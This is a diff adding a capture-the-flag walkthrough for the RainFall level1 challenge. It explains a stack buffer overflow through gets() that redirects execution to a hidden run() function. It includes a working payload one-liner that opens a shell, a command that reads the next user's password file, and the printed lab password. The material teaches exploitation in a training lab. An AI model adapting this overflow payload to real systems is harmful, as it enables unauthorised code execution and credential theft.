@@ -1,0 +1,65 @@
+Let's see what we have?
+
+level1@RainFall:~$ ls -la
+
+We have one binary file level1 from user level2
+Let's see what it contains?
+
+level1@RainFall:~$ gdb ./level1
+(gdb) disas main
+
+    Dump of assembler code for function main:
+       0x08048480 <+0>: push   %ebp
+       0x08048481 <+1>: mov    %esp,%ebp
+       0x08048483 <+3>: and    $0xfffffff0,%esp
+       0x08048486 <+6>: sub    $0x50,%esp
+       0x08048489 <+9>: lea    0x10(%esp),%eax
+       0x0804848d <+13>:mov    %eax,(%esp)
+       0x08048490 <+16>:call   0x8048340 <gets@plt>
+       0x08048495 <+21>:leave  
+       0x08048496 <+22>:ret    
+    End of assembler dump.
+
+Nothing interesting, except <gets@plt>
+Let's see which weak side it has. 
+After some reading we can find that if we overflow stack we can rewrite some information or address
+
+Good, But we dont know where password for next level. 
+Maybe we should call some another function after execute main.
+Let's see all availabel functions
+
+(gdb) info functions
+
+We FOUND!! function <run>. How can we call it? After execute the main we go to the return address.
+So we want to rewrite it to RUN's address using weakness of <gets@plt>
+
+In order to do it we should know the return address, so put the breakpoint at the end of the program.
+And run code with looong random argument
+
+echo "{random simbols with length grater then 80}" > /tmp/level1
+gdb ./level1
+(gdb) disas main
+(gdb) b * 0x08048496
+(gdb) r < /tmp/level1
+    Starting program: /home/user/level1/level1 < /tmp/level1
+    
+    Breakpoint 1, 0x08048496 in main ()
+    (gdb) c
+    Continuing.
+    
+    Program received signal SIGSEGV, Segmentation fault.
+    0x63413563 in ?? ()
+
+Now let's check the size of offsets using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+So, we should put address of RUN after 76 simbols of input argument
+Also we should write addres in reverse order: \x44\x84\x04\x08
+
+
+level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/buf
+level1@RainFall:~$ cat /tmp/buf - | ./level1
+    Good... Wait what?
+    cat /home/user/level2/.pass
+    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+level1@RainFall:~$ su level2
+Password:
